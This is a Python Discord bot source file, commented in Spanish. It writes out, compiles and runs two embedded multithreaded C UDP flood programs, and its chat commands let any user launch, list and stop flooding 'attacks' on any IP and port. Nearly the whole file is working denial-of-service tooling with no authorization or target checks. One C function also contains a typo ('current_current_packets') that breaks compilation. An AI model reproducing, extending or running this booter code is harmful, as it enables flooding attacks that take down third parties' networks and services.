import discord
from discord.ext import commands
import subprocess
import os
import time
import shlex
import signal

# Definir los nombres de los scripts/binaries
UDP_HEX_V1_SCRIPT = "./udphexv1"
UDP_HEX_V2_SCRIPT = "./udphexv2"

# Almacén de procesos lanzados: pid -> {proc, name, cmd, log}
running_processes = {}

# Crear el bot con intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)


# Evento al iniciar el bot
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user.name}')


# Comando para guardar el token
@bot.command()
async def settoken(ctx, token: str):
    """Guardar el token"""
    with open("token.txt", "w") as f:
        f.write(token)
    await ctx.send("Token guardado en token.txt")


# Función para leer el token desde el archivo
def get_token():
    try:
        with open("token.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None


def ensure_binaries():
    """
    Si los binarios no existen, compila los archivos C incluidos como antes.
    Esta función intenta compilar udphexv1.c y udphexv2.c si los ejecutables no existen.
    """
    # Si ambos binarios ya existen, salir
    if os.path.isfile(UDP_HEX_V1_SCRIPT) and os.path.isfile(UDP_HEX_V2_SCRIPT):
        return

    # Se recrean/compilan como en la versión original (siempre cuidado con ejecutar esto)
    # Es la misma lógica que había: escribir los .c y compilar con gcc
    try:
        # Escritura de udphexv1.c
        with open("udphexv1.c", "w") as f:
            f.write("""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_PACKET_SIZE 65507
#define DEFAULT_THREADS 4
#define DEFAULT_DURATION 30

typedef struct {
    char *target_ip;
    int target_port;
    int packet_size;
    int delay_ms;
    int duration;
    int thread_id;
    volatile int *running;
    unsigned long *packets_sent;
} thread_data_t;

// Estadísticas globales
volatile int running = 1;
unsigned long total_packets = 0;
time_t start_time;

// Función para generar datos aleatorios
void generate_random_data(char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

// Función para generar datos hexadecimales específicos
void generate_hex_data(char *buffer, int size, const char *hex_pattern) {
    int pattern_len = strlen(hex_pattern);
    for (int i = 0; i < size; i++) {
        buffer[i] = hex_pattern[i % pattern_len];
    }
}

// Función para crear paquete con patrón personalizado
void create_custom_packet(char *buffer, int size, int thread_id, unsigned long packet_num) {
    // Cabecera con información del thread y número de paquete
    memcpy(buffer, &thread_id, sizeof(int));
    memcpy(buffer + sizeof(int), &packet_num, sizeof(unsigned long));
    
    // Datos aleatorios para el resto del paquete
    generate_random_data(buffer + sizeof(int) + sizeof(unsigned long), 
                        size - sizeof(int) - sizeof(unsigned long));
}

// Handler para señales (Ctrl+C)
void signal_handler(int sig) {
    running = 0;
    printf("\\nDeteniendo test...\\n");
}

// Función de worker thread
void *udp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in target_addr;
    char packet_buffer[MAX_PACKET_SIZE];
    unsigned long local_packets = 0;
    struct timespec delay_time = {0, data->delay_ms * 1000000L};
    
    // Crear socket UDP
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Error creando socket");
        return NULL;
    }
    
    // Configurar socket para no bloquear (opcional para máximo rendimiento)
    int optval = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    // Configurar dirección destino
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    printf("Thread %d iniciado - Objetivo: %s:%d\\n", 
           data->thread_id, data->target_ip, data->target_port);
    
    time_t thread_start = time(NULL);
    
    while (*data->running && (time(NULL) - thread_start) < data->duration) {
        // Crear paquete personalizado
        create_custom_packet(packet_buffer, data->packet_size, 
                           data->thread_id, local_packets);
        
        // Enviar paquete
        ssize_t sent = sendto(sockfd, packet_buffer, data->packet_size, 0,
                            (struct sockaddr*)&target_addr, sizeof(target_addr));
        
        if (sent > 0) {
            local_packets++;
            __sync_fetch_and_add(data->packets_sent, 1);
        }
        
        // Pequeña pausa si se especificó delay
        if (data->delay_ms > 0) {
            nanosleep(&delay_time, NULL);
        }
    }
    
    close(sockfd);
    printf("Thread %d finalizado - Paquetes enviados: %lu\\n", 
           data->thread_id, local_packets);
    
    return NULL;
}

// Función para mostrar estadísticas en tiempo real
void *stats_thread(void *arg) {
    time_t last_time = start_time;
    unsigned long last_packets = 0;
    
    while (running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        unsigned long current_packets = total_packets;
        
        double elapsed = difftime(current_time, last_time);
        unsigned long packets_diff = current_current_packets - last_packets;
        double pps = (elapsed > 0) ? packets_diff / elapsed : 0;
        
        printf("\\rEstadísticas: Total=%lu Paquetes, PPS=%.2f, Tiempo=%lds", 
               current_packets, pps, (current_time - start_time));
        fflush(stdout);
        
        last_time = current_time;
        last_packets = current_packets;
    }
    
    printf("\\n");
    return NULL;
}

void print_usage(const char *program_name) {
    printf("UDP Flood Tester Optimizado\\n");
    printf("Uso: %s <IP> <PUERTO> [OPCIONES]\\n\\n", program_name);
    printf("Opciones:\\n");
    printf("  -t NUM      Número de threads (default: %d)\\n", DEFAULT_THREADS);
    printf("  -s SIZE     Tamaño del paquete en bytes (default: 1024)\\n");
    printf("  -d SECS     Duración en segundos (default: %d)\\n", DEFAULT_DURATION);
    printf("  -D MS       Delay entre paquetes en ms (default: 0 - máximo rendimiento)\\n");
    printf("  -h          Mostrar esta ayuda\\n\\n");
    printf("Ejemplos:\\n");
    printf("  %s 192.168.1.1 80 -t 8 -s 512 -d 60\\n", program_name);
    printf("  %s 10.0.0.1 443 -t 16 -s 2048 -D 1\\n", program_name);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        print_usage(argv[0]);
        return 1;
    }
    
    // Configuración por defecto
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = DEFAULT_THREADS;
    int packet_size = 1024;
    int duration = DEFAULT_DURATION;
    int delay_ms = 0;
    
    // Parsear argumentos
    int opt;
    while ((opt = getopt(argc, argv, "t:s:d:D:h")) != -1) {
        switch (opt) {
            case 't':
                num_threads = atoi(optarg);
                break;
            case 's':
                packet_size = atoi(optarg);
                break;
            case 'd':
                duration = atoi(optarg);
                break;
            case 'D':
                delay_ms = atoi(optarg);
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            default:
                print_usage(argv[0]);
                return 1;
        }
    }
    
    // Validaciones
    if (packet_size > MAX_PACKET_SIZE) {
        printf("Error: Tamaño de paquete máximo es %d\\n", MAX_PACKET_SIZE);
        return 1;
    }
    
    if (packet_size < (int)(sizeof(int) + sizeof(unsigned long))) {
        printf("Error: Tamaño de paquete mínimo es %lu\\n", 
               sizeof(int) + sizeof(unsigned long));
        return 1;
    }
    
    printf("=== UDP Flood Tester Optimizado ===\\n");
    printf("Objetivo: %s:%d\\n", target_ip, target_port);
    printf("Threads: %d\\n", num_threads);
    printf("Tamaño paquete: %d bytes\\n", packet_size);
    printf("Duración: %d segundos\\n", duration);
    printf("Delay: %d ms\\n", delay_ms);
    printf("Iniciando ataque en 3 segundos...\\n");
    sleep(3);
    
    // Configurar handler para Ctrl+C
    signal(SIGINT, signal_handler);
    
    // Inicializar estadísticas
    start_time = time(NULL);
    
    pthread_t *threads = malloc(num_threads * sizeof(pthread_t));
    pthread_t stats_tid;
    thread_data_t *thread_data = malloc(num_threads * sizeof(thread_data_t));
    
    if (!threads || !thread_data) {
        perror("Error asignando memoria");
        return 1;
    }
    
    // Crear thread de estadísticas
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Crear threads workers
    for (int i = 0; i < num_threads; i++) {
        thread_data[i].target_ip = target_ip;
        thread_data[i].target_port = target_port;
        thread_data[i].packet_size = packet_size;
        thread_data[i].delay_ms = delay_ms;
        thread_data[i].duration = duration;
        thread_data[i].thread_id = i;
        thread_data[i].running = &running;
        thread_data[i].packets_sent = &total_packets;
        
        if (pthread_create(&threads[i], NULL, udp_flood_thread, &thread_data[i]) != 0) {
            perror("Error creando thread");
            running = 0;
            break;
        }
    }
    
    // Esperar a que terminen los threads workers
    for (int i = 0; i < num_threads; i++) {
        if (threads[i]) {
            pthread_join(threads[i], NULL);
        }
    }
    
    // Esperar thread de estadísticas
    running = 0;
    pthread_join(stats_tid, NULL);
    
    // Estadísticas finales
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, start_time);
    double avg_pps = (total_time > 0) ? total_packets / total_time : 0;
    
    printf("\\n=== Estadísticas Finales ===\\n");
    printf("Paquetes totales enviados: %lu\\n", total_packets);
    printf("Tiempo total: %.2f segundos\\n", total_time);
    printf("Promedio PPS: %.2f paquetes/segundo\\n", avg_pps);
    printf("Ancho de banda aproximado: %.2f MB/s\\n", 
           (total_packets * packet_size) / (total_time * 1024 * 1024));
    
    // Limpiar memoria
    free(threads);
    free(thread_data);
    
    return 0;
}""")

        # Escritura de udphexv2.c
        with open("udphexv2.c", "w") as f:
            f.write("""#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <time.h>
#include <pthread.h>

#define SIZE 1400

struct argsattack{
    char *ip;
    unsigned short port;
    time_t start;
    int duracion;
};

int countcpu(void){
    int cpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu <= 0){
        fprintf(stderr, "\\n[ UDP HEX ] Error de conteo de cpus");
        exit(1);
    }
    return cpu * 2; // Probar la *2
}

void *udp(void *arg){
    struct argsattack *args = (struct argsattack *)arg;
    unsigned char payload[SIZE];
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock < 0){
        perror("sock");
        return NULL;
    }
    
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(args->port);
    dst.sin_addr.s_addr = inet_addr(args->ip);
    
    connect(sock, (struct sockaddr*)&dst, sizeof(dst));
    
    unsigned int seed = time(NULL) ^ (unsigned int)pthread_self();
    
    while(time(NULL) - args->start < args->duracion){
        for(int i = 0; i < SIZE; i++){
            payload[i] = rand_r(&seed) & 0xFF;
        }
        
        send(sock, payload, SIZE, 0);
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]){
    if(argc != 4){
        fprintf(stderr, "uso: ./%s <ip> <port> <time>", argv[0]);
        return 1;
    }
    struct argsattack args;
    args.ip = argv[1];
    args.port = atoi(argv[2]);
    args.duracion = atoi(argv[3]);
    time_t inicio = time(NULL);
    args.start = inicio;
    
    int tam = countcpu();
    
    pthread_t *thr = calloc(tam, sizeof(pthread_t));
    if(!thr){
        fprintf(stderr, "\\n[ UDP HEX ] Error de asignacion de memoria.\\n");
        exit(1);
    }
    
    for(int i = 0; i < tam; i++){
        if(pthread_create(&thr[i], NULL, udp, &args) != 0){
            fprintf(stderr, "\\n[ UDP HEX ] Error de inicializacion de hilos\\n");
            free(thr);
            exit(1);
        }
    }
    
    printf("[ UDP HEX ] Send ip: %s port: %hd time: %d", args.ip, args.port, args.duracion);
    fflush(stdout);
    
    for(int i = 0; i < tam; i++){
        pthread_join(thr[i], NULL);
    }
    
    free(thr);
    return 0;
}""")

        # Compilar
        print("Compilando udphexv1...")
        subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv1", "udphexv1.c"], check=True)
        print("Compilando udphexv2...")
        subprocess.run(["gcc", "-O3", "-pthread", "-o", "udphexv2", "udphexv2.c"], check=True)

        # Limpiar .c
        try:
            os.remove("udphexv1.c")
            os.remove("udphexv2.c")
        except OSError:
            pass

        # Ajustar permisos si es Unix
        try:
            os.chmod("udphexv1", 0o755)
            os.chmod("udphexv2", 0o755)
        except OSError:
            pass

    except subprocess.CalledProcessError as e:
        print(f"Error al compilar: {e}")
        print("Asegúrate de tener gcc instalado")
    except Exception as e:
        print(f"Error en ensure_binaries: {e}")


def start_process(command, name):
    """
    Inicia un proceso en segundo plano, guarda su info en running_processes y devuelve el pid.
    El stdout/stderr se redirige a un archivo de log (name_<timestamp>.log).
    """
    ts = int(time.time())
    log_path = f"{name}_{ts}.log"
    logfile = open(log_path, "ab")

    # Preparar la ejecución en segundo plano sin bloquear el bot
    if os.name != "nt":
        # Unix: evitar que la señal Ctrl+C mate al hijo y agrupar procesos
        proc = subprocess.Popen(command, stdout=logfile, stderr=subprocess.STDOUT, preexec_fn=os.setpgrp)
    else:
        # Windows: creación de nuevo grupo de procesos
        proc = subprocess.Popen(command, stdout=logfile, stderr=subprocess.STDOUT, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

    running_processes[proc.pid] = {"proc": proc, "name": name, "cmd": command, "log": log_path}
    return proc.pid


@bot.command()
async def udphexv1(ctx, ip: str, port: str, duration: int, threads: int = 4, size: int = 1024, delay: int = 0):
    """
    Inicia udphexv1 en segundo plano.
    Uso: !udphexv1 <ip> <port> <duration> [threads=4] [size=1024] [delay_ms=0]
    """
    # Validaciones básicas
    try:
        int_port = int(port)
        if int_port <= 0 or int_port > 65535:
            await ctx.send("Puerto inválido.")
            return
    except ValueError:
        await ctx.send("Puerto inválido.")
        return

    if duration <= 0:
        await ctx.send("Duración debe ser > 0 segundos.")
        return

    # Asegurar binarios
    ensure_binaries()
    if not os.path.isfile(UDP_HEX_V1_SCRIPT):
        await ctx.send(f"Error: no se encontró el script {UDP_HEX_V1_SCRIPT}")
        return

    # Construir comando acorde a udphexv1.c
    command = [UDP_HEX_V1_SCRIPT, ip, str(int_port), "-t", str(threads), "-s", str(size), "-d", str(duration)]
    if delay > 0:
        command += ["-D", str(delay)]

    pid = start_process(command, "udphexv1")
    await ctx.send(f"Iniciado udphexv1 PID={pid}. Log: {running_processes[pid]['log']}")


@bot.command()
async def udphexv2(ctx, ip: str, port: str, duration: int):
    """
    Inicia udphexv2 en segundo plano.
    Uso: !udphexv2 <ip> <port> <time>
    """
    # Validaciones básicas
    try:
        int_port = int(port)
        if int_port <= 0 or int_port > 65535:
            await ctx.send("Puerto inválido.")
            return
    except ValueError:
        await ctx.send("Puerto inválido.")
        return

    if duration <= 0:
        await ctx.send("Duración debe ser > 0 segundos.")
        return

    # Asegurar binarios
    ensure_binaries()
    if not os.path.isfile(UDP_HEX_V2_SCRIPT):
        await ctx.send(f"Error: no se encontró el script {UDP_HEX_V2_SCRIPT}")
        return

    command = [UDP_HEX_V2_SCRIPT, ip, str(int_port), str(duration)]
    pid = start_process(command, "udphexv2")
    await ctx.send(f"Iniciado udphexv2 PID={pid}. Log: {running_processes[pid]['log']}")


@bot.command()
async def attacks(ctx):
    """Lista ataques/procesos lanzados por el bot"""
    if not running_processes:
        await ctx.send("No hay ataques en curso.")
        return

    lines = []
    for pid, info in running_processes.items():
        proc = info["proc"]
        status = "running" if proc.poll() is None else f"exited (code={proc.returncode})"
        lines.append(f"PID={pid} Name={info['name']} Status={status} Cmd={' '.join(info['cmd'])} Log={info['log']}")
    # Enviar como bloque de texto
    await ctx.send("Procesos:\n" + "```" + "\n".join(lines) + "```")


@bot.command()
async def stop(ctx, target: str):
    """
    Detiene un proceso por PID o por nombre.
    Uso: !stop <pid>  o  !stop udphexv1
    """
    # Intentar PID primero
    try:
        pid = int(target)
        if pid not in running_processes:
            await ctx.send(f"No se encontró proceso con PID {pid} gestionado por este bot.")
            return
        info = running_processes[pid]
        proc = info["proc"]
        try:
            # Terminar el proceso y su grupo
            if os.name != "nt":
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
        except Exception:
            try:
                proc.terminate()
            except Exception as e:
                await ctx.send(f"Error al detener PID {pid}: {e}")
                return

        await ctx.send(f"Enviada señal de terminación a PID {pid}.")
        # No bloquear esperando; opcionalmente hacer poll
        time.sleep(0.5)
        proc.poll()
        status = "detenido" if proc.returncode is not None else "aún activo"
        # Cerrar entry si terminó
        if proc.returncode is not None:
            running_processes.pop(pid, None)
        await ctx.send(f"Estado PID {pid}: {status}")
        return
    except ValueError:
        # No es PID; tratar como nombre
        name = target.strip().lower()
        to_kill = [pid for pid, info in running_processes.items() if info["name"].lower() == name]
        if not to_kill:
            await ctx.send(f"No se encontraron procesos con nombre {name} gestionados por este bot.")
            return
        stopped = []
        for pid in to_kill:
            info = running_processes.get(pid)
            if not info:
                continue
            proc = info["proc"]
            try:
                if os.name != "nt":
                    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                else:
                    proc.terminate()
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
            stopped.append(pid)

        await ctx.send(f"Se enviaron señales de terminación a PIDs: {', '.join(map(str, stopped))}")
        # Limpiar entradas de procesos que ya terminaron
        time.sleep(0.5)
        for pid in list(running_processes.keys()):
            if running_processes[pid]["proc"].poll() is not None:
                running_processes.pop(pid, None)
        return


# Ejecutar el bot
if __name__ == "__main__":
    # Asegurar binarios al arrancar (compila si hace falta)
    ensure_binaries()

    # Leer el token desde el archivo
    token = get_token()

    if token:
        bot.run(token)
    else:
        print("No se encontró el token, guarda el token en token.txt usando el comando !settoken")
